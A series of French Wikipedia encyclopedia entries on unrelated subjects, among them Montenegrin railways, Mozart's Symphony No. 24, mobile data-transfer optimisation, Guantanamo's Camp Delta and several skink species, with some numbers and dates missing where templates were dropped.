Dans sa totalité, le réseau ferroviaire monténégrin fait de long dont de voies électrifiées à , AC. L'écartement de l'ensemble des voies est de soit l'écartement standard. Il y a 121 tunnels couvrant de voies, ainsi que 120 ponts et 9 galeries. Le réseau est constitué de trois lignes qui convergent à Podgorica.
Connexions ferroviaires avec les pays adjacents.
Le Monténégro possède une connexion ferroviaire avec deux de ses quatre pays voisins :
Gestion.
Depuis 2008, le réseau ferroviaire monténégrin est géré par la compagnie publique ŽICG (Жељезничка Инфраструктура Црне Горе / Željeznička Infrastruktura Crne Gore) basée à Podgorica. Elle s'occupe de la gestion et de la maintenance du réseau.
Transport de passagers.
Depuis 2008 et la dissolution de la compagnie publique nationale ŽCG, quatre compagnies publiques gèrent le transport ferroviaire au Monténégro. La compagnie publique ŽPCG (Жељезнички превоз Црне Горе / Željeznički prevoz Crne Gore) est chargée du transport de passagers et de l'exploitation du matériel roulant nécessaire à ce transport.
Cette compagnie basée à Podgorica possède 39 locomotives (23 diesel, 19 électriques) et 5 automoteurs (traction électrique). Une partie de ces locomotives ne sont pas en état de marche et nécessite des réparations.
Fret.
La compagnie publique Montecargo est chargée du transport de marchandises à l'intérieur du Monténégro et de l'exploitation des locomotives et des wagons affectés au transport du fret. Montecargo dispose de 17 locomotives (dont 15 en état de fonctionnement) et de 713 wagons de fret.
En 2010, le chiffre d'affaires de Montecargo était de 10 millions d'euros et son résultat net était de 1,5 million d'euros. Cette entreprise emploie 209 personnes.
Entretien du matériel roulant.
L'entreprise publique OŽVS (Održavanje željezničkih voznih sredstava / Одржавање желјезничких возних средстава) s'occupe de l'entretien du matériel roulant utilisé pour le transport de passagers et de marchandises. Cette compagnie faisait partie de ŽPCG avant de devenir une entreprise distincte en 2011.

</doc>
<doc id="6805982" url="https://fr.wikipedia.org/wiki?curid=6805982" title="Dobra (Bolesławiec)">
Dobra (Bolesławiec)

Dobra (prononciation : ) est un village de Pologne, situé dans la voïvodie de Basse-Silésie. Il fait partie de la gmina de Bolesławiec, dans le powiat de Bolesławiec.

</doc>
<doc id="6805983" url="https://fr.wikipedia.org/wiki?curid=6805983" title="Louis Le Poittevin">
Louis Le Poittevin

Louis-Paul Le Poittevin né le à La Neuville-Chant-d'Oisel, où il est mort le , est un peintre français.
On lui doit des paysages normands ou orientalistes. Il expose au Salon des artistes français de 1877 à 1907.
Il ne doit pas être confondu avec son homonyme, sans lien de parenté, Eugène Lepoittevin, peintre et caricaturiste.
Biographie.
Louis-Paul Le Poittevin est le fils d'Alfred Le Poittevin, poète, avocat au barreau de Rouen, grand ami de Gustave Flaubert, et de Louise de Maupassant. Il est le cousin de l'écrivain Guy de Maupassant dont il est le confident et ami et avec lequel il entretient une correspondance . En 1869, Louis Le Poittevin épouse Lucie Ernoult et s'installe à la Neuville-Chant-d'Oisel. Le , il épouse en secondes noces Félicité Hédé à Éréac.
Maupassant lui dédie une nouvelle parue en 1883 intitulée "L'Âne".
Il est un élève de Gustave Morin, de Philippe Zacharie, de William Bouguereau et de Tony Robert-Fleury.
Peintre célébré de son vivant, d'un talent , dont les œuvres et , donnent selon Léon Roger-Milès, sont achetés au Salon et trouvent leur place dans les musées du Havre, de Rouen ("Le Lever de lune" acquis en 1889, "La Montée de Bénouville" acquis 1886), ou de Fécamp. Il vend régulièrement sa peinture en salle des ventes, faite de paysages dont de nombreuses vues d'Étretat ("Le Petit Val", Sète, musée Paul-Valéry), et du pays de Caux ("Paysage normand", Fécamp, musée des Pêcheries) ; son art est alors décrit comme 
Après avoir perdu l'usage de sa main, longuement malade et affaibli, il meurt en 1909. Son atelier passe en salle des ventes la même année.
Son œuvre la plus célèbre, "Les Toiles d'araignées", une huile sur toile de de 1890, représente un paysage agricole d'hiver où le givre et la neige forment des fils de soie enchevêtrés au hasard sur des buissons, évoquant toujours pour Roger-Milès . La toile fut exposée au Salon de 1890 et acquise par le musée des Beaux-Arts de Reims, elle était considérée par Roger-Milès comme une symphonie plaintive où le peintre Ainsi, Louis Le Poittevin peint 

</doc>
<doc id="6805984" url="https://fr.wikipedia.org/wiki?curid=6805984" title="Optimisation des transferts de données sur les réseaux mobiles">
Optimisation des transferts de données sur les réseaux mobiles

Cet article traite des différentes techniques d'optimisation des transferts de données sur les réseaux mobiles. Le but est de permettre d'avoir un aperçu des différentes solutions possibles ainsi que de leurs avantages et leurs inconvénients.
À noter que certaines des techniques présentées ci-dessous ne sont pas limitées aux réseaux mobiles et peuvent s'appliquer à tout type de transferts.
But de l'optimisation.
Optimiser les transferts de données permet de réduire l'impact énergétique sur les périphériques mobiles (smartphone ou tablette tactile). 
Des transferts optimisés permettent :
Ceci permet en outre un gain d'énergie considérable mais aussi un gain financier de par le coût élevé des communications mobiles ainsi qu'une utilisation plus fluide du périphérique mobile.
Techniques d'optimisation.
Développement d'un site mobile.
Dans le cadre des applications web, développer un site web dédié au mobile se révèle très bénéfique. Une approche naïve serait d'effectuer une mise à l'échelle via un CSS, ainsi qu'éventuellement une remise en forme. Les sections ci-dessous, ainsi que le chapitre abordant la compression des données nous expliquent pourquoi cela n'est pas suffisant et quelles sont les bonnes pratiques à respecter.
JavaScript.
La technologie JavaScript est coûteuse au niveau de l'utilisation du CPU. Dans la mesure du possible, il est recommandé de ne l'utiliser qu'à juste titre.
Par exemple, pour attribuer un identifiant aux différents éléments d'une page web on peut :
Dans le cadre d'un développement mobile, la seconde approche sera préférable afin de minimiser les calculs effectués par le périphérique mobile. D'un point de vue transfert de données, une autre bonne pratique est de créer un fichier JavaScript propre à chaque page web. Celui-ci devant contenir uniquement les fonctions utiles. Ce point est à prendre en compte particulièrement lors de l'utilisation de librairies génériques telles que jQuery. Remarquons également que l'utilisation de requêtes JavaScript dynamiques empêche l'utilisation d'un cache de données.
CSS.
Tout comme pour le JavaScript, le traitement du CSS est couteux en CPU, il est donc conseillé de minimiser l'utilisation de règles CSS et de proposer une apparence simplifiée. De plus, le support du CSS sur les navigateurs mobiles n'est pas aussi complet que sur les navigateurs de bureau.
Pour optimiser le transfert de données, il est également recommandé de créer un fichier CSS propre à chaque page web. Celui-ci devant contenir uniquement les règles utiles.
Compression des données.
Minification.
La minification est une technique qui permet de réduire la taille des fichiers sources (JavaScript/CSS). Il existe plusieurs techniques de minification :
L'exécution du code aboutit à un résultat identique, les transferts sont allégés, mais le code devient difficilement lisible. La minification est également une technique d'offuscation du code.
Traitement des images.
Pour optimiser les transferts des images, on peut travailler sur deux paramètres : son format de codage et sa résolution. Il est également possible de transférer plusieurs images au travers d'une seule grâce aux Sprite CSS.
Format d'encodage.
Suivant la plateforme mobile utilisée, un format d'image peut s'avérer plus performant qu'un autre.
Le format Bitmap (bmp) est le plus coûteux par le fait que c'est un format non compressé ; il n'a donc pas besoin d'être décodé avant d'être affiché. Ce coût s'explique par l'absence de compression qui alourdit considérablement le volume des transferts de données. Le gain de ressources CPU n'est, de fait, pas suffisant pour compenser la perte de ressource radio.
Redimensionnement.
Il existe deux stratégies concernant la gestion des images :
La première solution consomme plus de ressources radio et CPU mais permet d'effectuer un zoom immédiat. La seconde solution permet d'optimiser l'utilisation des ressources, cependant le zoom ne peut plus être effectué de façon immédiate. L'utilisateur devra charger une version haute résolution de l'image avant de pouvoir effectuer un zoom.
Il est donc recommandé de mélanger les deux solutions :
Sprite CSS.
Les Sprite CSS permettent de rassembler une multitude de petites images dans une grande image. L'ensemble des images est alors téléchargé en transférant un unique fichier, ce qui est moins couteux que de transférer plusieurs petits fichiers.
Ceci permet de diminuer le RTT. La partie du Sprite CSS que l'on désire afficher est déterminée à l'aide de règles CSS. Cette technique de regroupement peut également être utilisée pour d'autres ressources telles que les fichiers JavaScript.
Traitement des données audio et vidéo.
Lorsqu'un périphérique mobile demande à accéder à un fichier audio ou vidéo, le serveur doit lui retourner un fichier adapté. 
Pour un fichier vidéo, il sera adapté en fonction du format d'affichage du périphérique (nombre de pixels). Ceci permet de minimiser la quantité de données transférée et de diminuer l'utilisation du CPU en allégeant l'opération de décodage. Pour cela, le serveur peut :
La première solution permet de fournir un fichier parfaitement adapté au périphérique. Cependant, cela peut entrainer un usage intensif des ressources du serveur s'il reçoit de nombreuses requêtes simultanées. La seconde solution permet de fournir un fichier générique, plus ou moins adapté au périphérique. C'est cette solution qui a été adoptée par les sites de "streaming" tels que YouTube et DailyMotion. L'avantage est que le travail de transcodage est effectué une fois pour toutes, en contrepartie de l'espace de stockage supplémentaire est utilisé côté serveur.
Le même principe est utilisé pour les fichiers audio : le serveur fournira un fichier adapté à la qualité du système audio du périphérique.
Compression des entêtes IP.
Les entêtes des paquets IP ont une taille importante, de 40 à 60 octets selon les variantes (IPv4 ou IPv6) ; Des méthodes normalisées par l'IETF permettent de compresser fortement ces entêtes, par exemple le protocole ROHC () qui est adapté aux communications point-à-point via les réseaux mobiles. Ce protocole est notamment utilisé pour compresser la « voix sur IP » (VoLTE) dans les réseaux 4G.
Mise en cache.
Les caches permettent de conserver sur le périphérique des ressources obtenues et susceptibles d'être réutilisées. Ces ressources sont enregistrées lors de leur chargement afin d'éviter un nouveau chargement par la suite. Ce système est implémenté dans la majorité des navigateurs du marché. Les caches permettent également de diminuer les goulots d'étranglement des entrées/sorties en diminuant le RTT et en diminuant l'utilisation de bande passante.
Le comportement du cache peut être contrôlé au travers de protocoles tels que le Cache-control dans HTTP. De plus, les ressources mises en cache peuvent être associées à un délai d'expiration. Si le délai arrive à expiration, la ressource est supprimée du cache et chargée à nouveau lors de sa prochaine utilisation.
Mise en cache prédictive.
La mise en cache prédictive consiste à mettre en cache les ressources qui seront prochainement utilisées par le client. Il existe différentes techniques de mise en cache prédictives :
Notons que les techniques de préchargement et de chargement spéculatif n'offrent aucune garantie d'optimisation ! Dans le meilleur des cas, la navigation s'effectuera de manière quasi instantanée. Dans le pire des cas, des transferts supplémentaires et inutiles auront eu lieu.
Traitement distant.
Les calculs complexes sont très coûteux en temps CPU et entraîne donc une importante utilisation de la batterie. Il est possible de les déporter dans le Cloud suivant deux approches.
Web Proxy.
Le Web Proxy est une machine intermédiaire située entre le serveur distant et le client. Il intercepte le trafic en provenance du serveur, l'examine, le traite et le transmet au client. Les traitements appliqués peuvent être de nature diverse mais consistent généralement en l'application des autres techniques d'optimisation à la volée : compression des données, redimensionnement des images...
Afin de ne pas produire l'effet inverse de celui désiré, et donc ralentir les transferts, le Web Proxy doit disposer d'une grande bande passante. Notons que le trafic crypté (SSL) ne pourra être traité. Certains navigateurs Web tels que Opera et SkyFire, intègrent nativement un Web Proxy.
Serveur distant.
Au contraire du Web Proxy, le serveur distant n'agit pas en tant qu'intermédiaire. Le client charge l'ensemble du contenu et choisit d'envoyer au serveur distant ce qu'il veut sous-traiter.
Ce modèle implique donc une forte augmentation des transferts de données. La technologie actuelle ne permet pas de compenser le surcoût, engendré par l'utilisation de la puce radio, par le gain de CPU.
Protocoles.
Le protocole standard pour le web est HTTP, cependant des améliorations existent pour en améliorer ses performances.
SPDY.
SPDY est un protocole expérimental proposé par Google proposant plusieurs solutions pour accélérer le transfert via HTTP sans remplacer celui-ci. Les fonctionnalités de bases de SPDY sont les suivantes :
Les fonctionnalités avancées sont :
Certaines études tendent à démontrer que SPDY n'améliore pas le protocole HTTP de manière significative.
HTTP Speed+Mobility.
 est un protocole proposé par Microsoft. Tout comme le SPDY, celui-ci tend à accélérer les transferts HTTP sans remplacer ce protocole. Contrairement à SPDY, HTTP Speed+Mobility tend également à améliorer les transferts vers les équipements mobiles.
Transferts sans réseaux.
Dans le cas extrême où il n'est pas possible d'établir un réseau, il existe tout de même des moyens d'échanger des informations. Le Framework VisualComm permet d'effectuer des transferts de données en utilisant un flux de Code QR.
Les données sont transformées sous forme d'une suite de Code QR qui est ensuite numérisée par le périphérique mobile, à l'aide de la caméra, pour régénérer les données. Un mécanisme de correction d'erreur est inclus afin de compenser les pertes lors de la numérisation.
Mesure de l'optimisation.
Il existe plusieurs techniques permettant de mesurer l'efficacité de l'optimisation :
L'analyse de l'utilisation du réseau peut être élargie à une analyse des communications. Dans ce cas, on analysera non seulement les échanges effectués entre l'application et l'internet mais aussi :
Conclusion.
Si on regarde l'évolution des périphériques mobiles, terminaux mobiles et smartphones, on constate que leur puissance de calcul, leur capacité de stockage et le volume des données échangées ont été démultipliés ces dernières années. Cependant, l'autonomie des smartphones reste un point critique, la technologie des batteries évolue lentement et l'optimisation de l'autonomie est principalement réalisée par des optimisations logicielles et matérielles (CPU/GPU à fréquence variable, écran à luminosité variable, etc). À moyen terme, l'optimisation des transferts de données et des ressources des périphériques mobiles reste donc indispensable.

</doc>
<doc id="6805988" url="https://fr.wikipedia.org/wiki?curid=6805988" title="Camp Delta">
Camp Delta

Le camp Delta est un centre de détention permanent situé dans la baie de Guantanamo à Cuba, remplaçant les installations temporaires du camp X-Ray. Il est situé dans la zone de la baie contrôlée par les États-Unis. Ces premières installations sont construites entre le 27 février et mi-avril 2002. Il est composé de 6 camps, chacun ayant une spécialisation soit dans le type de détenus enfermés soit dans sa destination. Les prisonniers, dénommés détenus, n'ont pas de droits clairement établis, à cause de la localisation du camp à l'extérieur du sol américain. De nombreuses allégations de tortures et de sévices sur les prisonniers ont été rapportées.
La majorité des forces de sécurité sur place sont des membres de la police militaire de l'US Army ainsi que des capitaines d'armes de l'US Navy.
Les camps possèdent différents équipements et niveaux de confort. Les restrictions sont levées en fonction de la coopération des détenus avec les gardes et les responsables des interrogatoires, à l'exception des nouveaux venus qui se retrouvent toujours en sécurité maximale au camp 3. Par la suite, les prisonniers coopératifs sont déplacés vers le camp 2 puis vers le camp 1 comme récompense. Quand ils présentent des signes de coopération et ne présentent pas de problème de sécurité, ils peuvent être déplacés vers les bâtiments du camp 4, qui possèdent des douches et des lavabos, ainsi que quatre pièces de vie commune de 10 places chacune. Au camp 4, chaque détenu a droit à un lit et un casier. Ils peuvent aussi manger ensemble alors que dans les autres camps ils sont isolés. De plus, au camp 4, les prisonniers sont habillés avec des tenues blanches, contrastant avec les uniformes orange portés par ceux des autres camps. Enfin, en plus de ces avantages, les détenus du camp 4 ont droit aussi à des compléments alimentaires en adéquation avec leur régime, ainsi qu'à des temps de douche et d'exercice plus longs.

</doc>
<doc id="6805990" url="https://fr.wikipedia.org/wiki?curid=6805990" title="Typhlosaurus plowesi">
Typhlosaurus plowesi



</doc>
<doc id="6805991" url="https://fr.wikipedia.org/wiki?curid=6805991" title="Typhlosaurus meyeri">
Typhlosaurus meyeri

Typhlosaurus meyeri est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre dans le Richtersveld en Afrique du Sud et en Namibie.
Description.
C'est un saurien vivipare.
Étymologie.
Cette espèce est nommée en l'honneur d'Adolf Bernard Meyer.

</doc>
<doc id="6805992" url="https://fr.wikipedia.org/wiki?curid=6805992" title="JG Wallace">
JG Wallace

JG Wallace (ou simplement Wallace), de son vrai nom Stéphane Carpentier, né en 1967, est un scénariste de bande dessinée français.
Biographie.
En 2010, paraît le premier volume de la série "F.A.F.L Forces Aériennes Françaises Libres", avec un dessin de Stéphan Agosto : "Opération Dynamo" (Zéphyr Éditions), le récit portant sur un pilote durant la Seconde Guerre mondiale. Ce premier tome reçoit le Grand Prix 2010 lors du festival des rencontres de la bande dessinée aéronautique et spatiale qui se tenait, à l'époque, au musée de l’Air et de l’Espace du Bourget. En 2017, cette série s'achève et compte six volumes ; "Planète BD" souligne la qualité du scénario : , les personnages sont et les relations sont complexes .
À partir de 2013, l'association normande Jubilee et l'association normande de bande dessinée commandent au scénariste et au dessinateur Agosto un album historique sur Dieppe pendant la Seconde Guerre mondiale : "Opération Jubilee", allusion à l'opération Jubilee. Les planches font l'objet d'une exposition à Dieppe. En 2017 paraît le second volume, par les mêmes auteurs, basé sur : "Dieppe 42, histoires d'un raid". Les auteurs s'appuient sur le travail de documentation mené par les responsables historiques de l'organisme.
Toujours en 2017, Wallace participe à l'album collectif "Le Guide de Paris en bandes dessinées" (éditions "Petit à petit") sous la direction de Jim . Puis la même année, il scénarise la série "Eagle, l'aigle à deux têtes" (trois albums entre 2017 et 2019) avec le concours du dessinateur Julien Camp et chez "Zéphyr Éditions", l'éditeur spécialisé dans la bande dessinée d'aviation. Cette série (Eagle, ...) et sa série "jumelle" présentent le destin parallèle de deux pilotes, l'un américain (Eagle), l'autre, allemand (Adler), avant et durant la Seconde Guerre mondiale, la deuxième série, "Adler, l'aigle à deux têtes", étant scénarisée et illustrée par deux autres auteurs. 
En 2019, débute la série "Air America", qui a pour cadre la guerre du Viêt Nam, avec Julien Lepelletier au dessin et l'apport de Patrice Buendia en tant que co-scénariste. Deux albums de cette série sortent au cours de l'année 2019 à quelques mois d'intervalle : "Sur la piste Hô Chi Minh" puis "L’Offensive du Têt" .

</doc>
<doc id="6805993" url="https://fr.wikipedia.org/wiki?curid=6805993" title="Typhlosaurus vermis">
Typhlosaurus vermis

Typhlosaurus vermis est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique du Little Namaqualand en Afrique du Sud.
Description.
C'est un saurien vivipare.

</doc>
<doc id="6805994" url="https://fr.wikipedia.org/wiki?curid=6805994" title="Louis le Poittevin">
Louis le Poittevin



</doc>
<doc id="6805995" url="https://fr.wikipedia.org/wiki?curid=6805995" title="Womack">
Womack



</doc>
<doc id="6806003" url="https://fr.wikipedia.org/wiki?curid=6806003" title="Symphonie no 24 de Mozart">
Symphonie no 24 de Mozart

La Symphonie en si bémol majeur, , a été écrite à Salzbourg par Wolfgang Amadeus Mozart le à l'âge de dix-sept ans et demi.
Historique.
Les neuf symphonies dites « Salzbourgeoises » ont été écrites entre et . Voir l'historique de la "symphonie ".
Le manuscrit est conservé dans une collection privée à Vienne.
Structure.
La symphonie comprend trois mouvements :
Durée : environ 8 à 
Introduction de l"'Allegro spiritoso" :
\relative c {
 \override Score.NonMusicalPaperColumn #'line-break-permission = ##f
 \version "2.18.2"
 \tempo "Allegro spiritoso"
 \key bes \major
 \tempo 4 = 120
 &lt;bes bes, d,&gt;4\f f d r8 f |
 bes4 f d r |
 bes8.\trill\p( a32 bes) c8 a d8.\trill( c32 d) es8 c |
 bes8.\trill( a32 bes) c8 a d8.\trill( c32 d) es8 c |
&lt;/score&gt;
Première reprise de l"'Andantino grazioso"
\relative c" {
 \version "2.18.2"
 \key ees \major
 \tempo "Andantino grazioso"
 \time 2/4
 \tempo 4 = 60
 ees,8\p^\markup { \italic { con sordini } } (g) bes-! bes-!
 bes8. (ees16) \grace ees32 ( d8) c16-. bes-. 
 c (bes) aes-. g-. bes (aes) g-. f-.
 aes (g) f-. ees-. ees (d) c-. bes-.
 ees8 (g) bes-! bes-!
 bes8. (ees16) \grace ees32 ( d8) c16-. bes-.
 c (bes) aes-. g-. bes (aes) g-. f-.
 g (f) ees-. d-. ees8 r8 \bar ":|."
&lt;/score&gt;
Première reprise de l"'Allegro"
 \relative c" {
 \version "2.18.2"
 \key bes \major
 \tempo "Allegro"
 \time 3/8
 \tempo 4 = 130
 &lt;d bes'&gt;8\f &lt;d bes'&gt; &lt;d bes'&gt;
 &lt;d bes'&gt;4 (f8)
 ees\p ees ees
 ees4 (d8)
 g\f g g
 g4 (ees8)
 c\p c c
 bes4 (a8)
 &lt;d bes'&gt;8\f &lt;d bes'&gt; &lt;d bes'&gt;
 &lt;d bes'&gt;4 (f8)
 ees\p ees ees
 ees4 (d8)
 &lt;bes g'&gt;8\f &lt;bes g'&gt; &lt;bes g'&gt;
 &lt;bes f'&gt;4 (bes'8)
 ees, d c
 &lt;d, bes'&gt;4 r8\bar ":|."
&lt;/score&gt;

</doc>
<doc id="6806004" url="https://fr.wikipedia.org/wiki?curid=6806004" title="Bathymètre">
Bathymètre



</doc>
<doc id="6806005" url="https://fr.wikipedia.org/wiki?curid=6806005" title="Acontias caecus">
Acontias caecus



</doc>
<doc id="6806006" url="https://fr.wikipedia.org/wiki?curid=6806006" title="Typhline cuvierii">
Typhline cuvierii



</doc>
<doc id="6806007" url="https://fr.wikipedia.org/wiki?curid=6806007" title="Typhlosaurus caecus">
Typhlosaurus caecus

Typhlosaurus caecus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique des régions côtières de l'Ouest de l'Afrique du Sud.
Description.
C'est un saurien vivipare.

</doc>
<doc id="6806008" url="https://fr.wikipedia.org/wiki?curid=6806008" title="Un espion nommé Nelly">
Un espion nommé Nelly

Un espion nommé Nelly ("") est un film grec réalisé par et sorti en 1981.
Le film fut un échec commercial, ne tenant que trois semaines à l'affiche avec un peu plus de entrées. Cette déception poussa Alíki Vouyoukláki à prendre définitivement sa retraite.
Synopsis.
En 1936, à Berlin, Nelly (Alíki Vouyoukláki), une étudiante grecque, abandonne ses études pour chanter dans un cabaret. Elle est aidée par Vily Foster, un juif. Elle devient vite célèbre et attire l'attention du colonel Heinrich, un SS ainsi que d'un jeune écrivain Brian Robert. Quand la guerre commence, Nelly, Vily et Robert partent en Grèce et entrent dans la résistance. Nelly continue ses tours de chant, dans un club fréquenté par des officiers SS. Quand son réseau est trahi, elle est soupçonnée. En fait, le traître est Robert, qui est amoureux d'elle. Pour se venger d'avoir été éconduit, il est devenu officier SS.

</doc>
<doc id="6806019" url="https://fr.wikipedia.org/wiki?curid=6806019" title="La Ménagerie du Vatican ou le livre de la Noblesse Pontificale">
La Ménagerie du Vatican ou le livre de la Noblesse Pontificale



</doc>
<doc id="6806020" url="https://fr.wikipedia.org/wiki?curid=6806020" title="Tytthoscincus">
Tytthoscincus

Tytthoscincus est un genre de sauriens de la famille des Scincidae.
Répartition.
Les 23 espèces de ce genre se rencontrent en Asie du Sud-Est.
Liste des espèces.
Selon :
Systématique et taxinomie.
Ce genre a été révisé par Grismer, Muin, Wood, Anuar et Linkem en 2016

</doc>
<doc id="6806024" url="https://fr.wikipedia.org/wiki?curid=6806024" title="Jedynka Aleksandrów Łódzki">
Jedynka Aleksandrów Łódzki

Le Jedynka Aleksandrów Łódzki est un club féminin de volley-ball polonais fondé en 1995 et basé à Aleksandrów Łódzki, évoluant pour la saison 2012-2013 en 1. liga.
Effectifs.
Saison 2012-2013.
"Entraîneur : Mariusz Bujek "

</doc>
<doc id="6806025" url="https://fr.wikipedia.org/wiki?curid=6806025" title="Eudoxus (cratère lunaire)">
Eudoxus (cratère lunaire)

Eudoxus est un cratère lunaire situé sur la face visible de la Lune. Il se trouve à l'extrémité orientale du massif montagneux des Montes Caucasus situé autour de la Mare Orientale. Il est situé au sud du grand cratère Aristoteles, au sud se trouve le vieux cratère Alexandre et le petit cratère Lamèch se trouve au sud-ouest. Le contour du cratère Eudoxus a une formation en terrasse à l'intérieur et un peu érodé vers l'extérieur. Il n'y a pas de pic central mais un ensemble de petites collines. 
En 1935, l'Union astronomique internationale lui a attribué le nom d'Eudoxus en l'honneur de l'astronome grec Eudoxe de Cnide. 
Le cratère Eudoxus possède un certain nombre de cratères satellites identifiés avec des lettres.

</doc>
<doc id="6806030" url="https://fr.wikipedia.org/wiki?curid=6806030" title="Eudoxus (cratère)">
Eudoxus (cratère)



</doc>
<doc id="6806032" url="https://fr.wikipedia.org/wiki?curid=6806032" title="Lygosoma parvum">
Lygosoma parvum



</doc>
<doc id="6806033" url="https://fr.wikipedia.org/wiki?curid=6806033" title="Sphenomorphus parvus">
Sphenomorphus parvus



</doc>
<doc id="6806034" url="https://fr.wikipedia.org/wiki?curid=6806034" title="Tytthoscincus parvus">
Tytthoscincus parvus

Tytthoscincus parvus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Sulawesi en Indonésie.
Description.
L'holotype mesure de longueur totale dont de queue.

</doc>
<doc id="6806041" url="https://fr.wikipedia.org/wiki?curid=6806041" title="Kellylee Evans">
Kellylee Evans

Kellylee Evans, née le à Toronto, est une chanteuse de jazz et de musique soul canadienne. Elle est lauréate du prix Juno 2011 dans la catégorie "album de jazz vocal de l'année" pour son album "Nina".
Biographie.
Kellylee Evans, d’ascendance jamaïcaine, est née en 1975 à Scarborough (Ontario), un quartier à l'est de la ville de Toronto au Canada. Elle suit ses études à l'université Carleton, et découvre le jazz un jour où . Elle prépare deux Bachelors of Arts, en droit et en littérature anglaise, avant de commencer une maîtrise de droit en 1997. Elle arrête ses études en 2000 pour se consacrer à une carrière musicale.
En 2001, pendant le "Ottawa Jazz Festival", le contrebassiste Lonnie Plaxico l'invite à le rejoindre sur scène avec Ravi Coltrane de manière improvisée. Il lui suggère plus tard de s'inscrire au Thelonious Monk Institute of Jazz.
En 2004, elle gagne le deuxième prix du de jazz vocal du Thelonious Monk Institute of Jazz avec Quincy Jones, Dee Dee Bridgewater et Al Jarreau parmi les membres du jury.
En 2006 elle sort "Fight or Flight?", son premier album, pour lequel elle est nommée au prix Juno et au prix Gemini 2007. Elle remporte le prix de Meilleure artiste féminine de l’année aux "Canadian Smooth Jazz Awards" 2007.
L'album "Nina", récompensé dans la catégorie "album de jazz vocal de l'année" au Juno 2011, est inspiré par la vie et l’œuvre de Nina Simone. Il sort en 2010, la même année que l'album "The Good Girl", alors que Kellylie Evans consacre son temps à l'instruction à domicile de ses trois enfants en bas âge.
Lors de ses premières tournées internationales elle est présentée en première partie des concerts de George Benson, Tony Bennett, Chris Botti, Dianne Reeves, Maceo Parker, Derek Trucks et du groupe .
Le , Kellylee Evans est électrisée par une décharge de foudre alors qu'elle travaille chez elle. Les séquelles de cet accident l'obligent durant sa tournée internationale de l'été 2013 à se déplacer en fauteuil roulant et à chanter assise. S'ensuit une longue période de convalescence avant la réalisation d'un nouvel album, "Come On", en .
Juste avant la parution de cet album, Kellylee Evans fait une chute accidentelle dans sa douche, un grave traumatisme cranien qui réveille les symptômes de son électrocution, et l'obligera à rester allongée puis totalement inactive pendant deux ans. Son amie et chanteuse Amanda Martinez organise alors un concert de soutien et lance une campagne de don en ligne pour financer ses soins et dépenses familiales et personnelles, elle réussit à récolter plus de .
À l'été 2017, Kellylee Evans peut enfin remonter sur scène avec une formation acoustique pour présenter son album, en se limitant à quelques dates au Canada. Elle devient artiste en résidence à la "School for Studies in Art and Culture" de l'université Carleton à Ottawa, où elle produit une série de conférences artistiques.
L'album "Come On" est nommé dans la catégorie "album de jazz vocal de l'année" au Juno 2018.
Elle participe en 2018 à plusieurs festivals au Canada, ainsi qu'à l'opéra de marionnettes "Sleeping Rough" de lors du festival d'Ottawa.
Elle a fait son premier concert de retour en France le 16 mai 2019 lors du Festival Jazz à Saint-Germain-des-Prés Paris, avec deux autres concerts en France en octobre 2019 et une tournée en France du 6 mars 2020 au 30 avril 2020.
Discographie.
En solo :
Participations :

</doc>
<doc id="6806042" url="https://fr.wikipedia.org/wiki?curid=6806042" title="Un monde sans fin (mini-série)">
Un monde sans fin (mini-série)

Un monde sans fin ou Les Piliers de la Terre : Un monde sans fin au Québec ("") est une mini-série germano-canadienne en huit épisodes de 45 minutes réalisée par Michael Caton-Jones. Tirée du roman du même nom de Ken Follett, elle est la suite des "Piliers de la Terre". Produite par , Scott Free Productions, Take 5 Productions et Galafilm, la série a été diffusée à partir du sur au Canada, à partir du sur ReelzChannel aux États-Unis et sur Sat.1 en Allemagne.
En France, la série est diffusée à partir du sur Canal+ et au Québec à l'hiver 2013 sur AddikTV.
Synopsis.
L'histoire se déroule 150 ans après "Les Piliers de la terre". Elle relate les événements liés à la ville fictive anglaise de "Kingsbridge" lors du début de la Guerre de Cent Ans et de la peste noire qui arriverait en Europe en 1342 (au lieu de 1347 historiquement).
La série diverge significativement de l'œuvre littéraire. Elle a été tournée en Hongrie, Slovaquie et en Autriche.

</doc>
<doc id="6806043" url="https://fr.wikipedia.org/wiki?curid=6806043" title="Un monde sans fin (série télévisée)">
Un monde sans fin (série télévisée)



</doc>
<doc id="6806044" url="https://fr.wikipedia.org/wiki?curid=6806044" title="27 août 1963">
27 août 1963

Le est le jour de l'année 1963 du calendrier grégorien. Il s'agit d'un mardi. 

</doc>
<doc id="6806053" url="https://fr.wikipedia.org/wiki?curid=6806053" title="Lygosoma hallieri">
Lygosoma hallieri



</doc>
<doc id="6806054" url="https://fr.wikipedia.org/wiki?curid=6806054" title="Sphenomorphus hallieri">
Sphenomorphus hallieri



</doc>
<doc id="6806055" url="https://fr.wikipedia.org/wiki?curid=6806055" title="Tytthoscincus hallieri">
Tytthoscincus hallieri

Tytthoscincus hallieri est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Bornéo. Elle se rencontre au Kalimantan en Indonésie et dans l'État du Sabah en Malaisie orientale.
Description.
"Tytthoscincus hallieri" mesure jusqu'à de longueur standard. L'holotype mesure de longueur totale dont de longueur standard.
Étymologie.
Cette espèce est nommée en l'honneur de Johann Gottfried Hallier (1868–1932).

</doc>
<doc id="6806056" url="https://fr.wikipedia.org/wiki?curid=6806056" title="Karl Strehl">
Karl Strehl

Karl Wilhelm Andreas Strehl, né le à Bayreuth et mort le à Hof, est un physicien, astronome et opticien allemand qui inventa le rapport de Strehl, une mesure de la qualité des miroirs primaires pour les télescopes. Il fut le premier à s'intéresser au problème des perturbations atmosphériques pour les observations astronomiques.
En 1895, il calcula l'aspect qu'aurait la tache d'Airy produite par une lentille parfaite et théorisa que le rapport du pic d'intensité de la tache de diffraction d'une lentille réelle à celle d'une lentille parfaite pourrait permettre d'en estimer la qualité optique.

</doc>
<doc id="6806059" url="https://fr.wikipedia.org/wiki?curid=6806059" title="Kontiomäki">
Kontiomäki

Kontiomäki est une agglomération de Paltamo dans la région du Kainuu en Finlande.
Présentation.
Kontiomäki se situe à l'est de la nationale 5 et à 2,5 km de la nationale 22. Kontiomäki a 650 habitants.

</doc>
<doc id="6806064" url="https://fr.wikipedia.org/wiki?curid=6806064" title="Sphenomorphus atrigularis">
Sphenomorphus atrigularis



</doc>
